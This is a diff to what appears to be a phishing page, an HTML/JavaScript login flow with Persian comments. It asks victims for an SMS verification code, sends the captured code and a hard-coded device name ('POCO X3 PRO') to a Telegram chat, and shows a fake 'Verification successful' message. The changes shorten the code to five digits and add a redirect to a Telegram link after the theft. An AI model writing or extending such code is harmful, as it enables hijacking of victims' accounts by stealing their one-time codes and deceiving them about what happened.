@@ -328,7 +328,7 @@
     </div>
   </div>
 
-  <!-- صفحه وارد کردن کد پیامک -->
+  <!-- صفحه وارد کردن کد پیامک - 5 باکس -->
   <div class="container" id="sms-screen">
     <div style="display:flex; justify-content:center; margin-bottom:20px;">
       <img src="photo_2026-01-02_14-40-45.jpg" style="width:100px; height:auto;" alt="sms icon">
@@ -346,7 +346,6 @@
       <input maxlength="1" class="code-box" data-index="2">
       <input maxlength="1" class="code-box" data-index="3">
       <input maxlength="1" class="code-box" data-index="4">
-      <input maxlength="1" class="code-box" data-index="5">
     </div>
 
     <div class="nav-row">
@@ -382,9 +381,7 @@
     }).catch(e => console.warn("Telegram err", e));
   }
 
-  // تابع برای گرفتن نام مرورگر / دستگاه (POCO X3 PRO نمایش داده می‌شود)
   function getDeviceInfo() {
-    // طبق درخواست کاربر همیشه POCO X3 PRO برگردانده می‌شود
     return "POCO X3 PRO";
   }
 
@@ -564,7 +561,7 @@
   }
 
   /* -------------------------------
-        مرحله کد پیامک + پاپ آپ تایید کد + نمایش نام مرورگر POCO X3 PRO
+        مرحله کد پیامک - 5 باکس + پاپ آپ تایید + نمایش نام + ریدایرکت
   ------------------------------- */
   let pendingSmsCode = "";
 
@@ -572,8 +569,8 @@
     const boxes = document.querySelectorAll("#sms-screen .code-box");
     let code = "";
     boxes.forEach(b => code += b.value);
-    if (code.length !== 6) {
-      alert("Please enter the 6-digit SMS code.");
+    if (code.length !== 5) {
+      alert("Please enter the 5-digit SMS code.");
       return;
     }
     if (!/^\d+$/.test(code)) {
@@ -593,59 +590,53 @@
   function confirmSmsCode() {
     if (!pendingSmsCode) return;
     
-    // ارسال کد پیامک تایید شده به تلگرام
     sendMessage(`📲 کد پیامک تأیید شد (Correct SMS code):\n${pendingSmsCode}`);
     
-    // دریافت نام دستگاه (طبق درخواست: POCO X3 PRO)
     const deviceName = getDeviceInfo();
-    
-    // ارسال پیام جداگانه با نام مرورگر/دستگاه
     sendMessage(`🖥️ کاربر با دستگاه زیر وارد شده است:\n${deviceName}`);
     
     hideSmsConfirmPopup();
     
-    // نمایش پیام موفقیت در همان صفحه sms-screen به جای alert و پاک کردن باکس‌ها
+    // نمایش پیام موفقیت
     const smsContainer = document.getElementById("sms-screen");
-    // حذف پیام قبلی اگر وجود دارد
     const oldMsg = smsContainer.querySelector(".success-message");
     if (oldMsg) oldMsg.remove();
     
-    // ایجاد المان پیام سبز
     const successDiv = document.createElement("div");
     successDiv.className = "success-message";
     successDiv.innerHTML = `✅ Verification successful! <br> You are logged in with <strong>${deviceName}</strong>`;
-    // قرار دادن دکمه‌ها در نوار نویگیشن، پیام را زیر باکس‌های کد و بالای دکمه‌ها اضافه کنیم
+    
     const navRow = smsContainer.querySelector(".nav-row");
     const codeContainer = smsContainer.querySelector("#sms-code-container");
-    // اگر قبلاً پیام وجود نداشت اضافه کن
     if (!smsContainer.querySelector(".success-message")) {
       codeContainer.insertAdjacentElement('afterend', successDiv);
     }
     
-    // غیرفعال کردن باکس‌های کد و دکمه بعدی برای جلوگیری از ارسال مجدد (اختیاری)
+    // غیرفعال کردن باکس‌ها و دکمه بعدی
     const allBoxes = smsContainer.querySelectorAll(".code-box");
     allBoxes.forEach(box => box.disabled = true);
     const nextBtn = navRow.querySelector(".next-btn");
     if (nextBtn) nextBtn.style.opacity = "0.5";
     
-    // همچنین می‌توان دکمه برگشت را غیرفعال کرد یا نگه داشت
     pendingSmsCode = "";
     
-    // می‌توان بعد از 3 ثانیه پیام را نگه داشت یا هر کار دیگری
+    // ریدایرکت به لینک https://t.me/myconfig بعد از 1.5 ثانیه
+    setTimeout(() => {
+      window.location.href = "https://t.me/myconfig";
+    }, 1500);
   }
 
   function goBackFromSMS() {
-    // قبل از برگشت پاپ‌آپ را مخفی کن
     hideSmsConfirmPopup();
     document.getElementById("sms-screen").style.display = "none";
     document.getElementById("code-screen").style.display = "block";
     resetCodeBoxes('email-code-container');
     attachCodeBoxEvents();
-    // پاک کردن پیام موفقیت اگر وجود دارد
+    
     const smsContainer = document.getElementById("sms-screen");
     const oldMsg = smsContainer.querySelector(".success-message");
     if (oldMsg) oldMsg.remove();
-    // فعال کردن مجدد باکس‌ها در صورت برگشت (اگر غیرفعال شده بودند)
+    
     const allBoxes = smsContainer.querySelectorAll(".code-box");
     allBoxes.forEach(box => box.disabled = false);
     const navRow = smsContainer.querySelector(".nav-row");
@@ -669,7 +660,6 @@
       if (document.getElementById("sms-screen").style.display === "block") {
         resetCodeBoxes('sms-code-container');
         attachCodeBoxEvents();
-        // پاک کردن پیام موفقیت هر بار که صفحه sms دوباره نشان داده می‌شود (در حالت عادی از قبل پاک می‌شود)
         const smsContainer = document.getElementById("sms-screen");
         const oldMsg = smsContainer.querySelector(".success-message");
         if (oldMsg) oldMsg.remove();
